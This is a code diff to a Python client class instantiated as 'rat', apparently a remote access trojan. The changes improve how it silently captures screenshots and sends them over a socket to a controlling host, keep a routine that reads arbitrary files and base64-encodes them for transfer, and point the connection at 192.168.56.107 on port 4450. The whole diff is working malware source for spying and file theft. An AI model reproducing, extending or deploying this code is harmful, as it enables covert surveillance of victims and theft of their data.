@@ -5,8 +5,8 @@ import subprocess
 import os
 import base64
 import json
-import pyautogui
 import time
+import pyautogui
 
 class CLIENT:
 
@@ -37,15 +37,20 @@ class CLIENT:
         file.close()
         
     def screenshot(self):
-        subprocess.run(['scrot', 'screenshot.png'])
         file = 'screenshot.png'
+        pyautogui.screenshot(file)
+        time.sleep(5)
         file = open(file, 'rb')
         file_data = file.read()
+        data_len = len(file_data)
+        str_data_len = str(data_len)
+        sock.send(str_data_len.encode())
+        time.sleep(1)
         sock.send(file_data)
         file.close()
         time.sleep(.2)
         subprocess.run(['rm', 'screenshot.png'])
-
+        
     def cd(self, command):
         os.chdir(command[3:])
         directory = os.getcwd()
@@ -56,7 +61,6 @@ class CLIENT:
     def download(self, command):
         filename = command[9:]
         file = open(filename, "rb")
-        print(file)
         bytes = file.read(600000)
         base64_bytes = base64.b64encode(bytes)
         file_json = {
@@ -106,7 +110,7 @@ class CLIENT:
                 self.sendmessage()
                 continue
 
-rat = CLIENT('127.0.0.1', 4444)
+rat = CLIENT('192.168.56.107', 4450)
 
 if __name__ == '__main__':
     # rat.installdep()
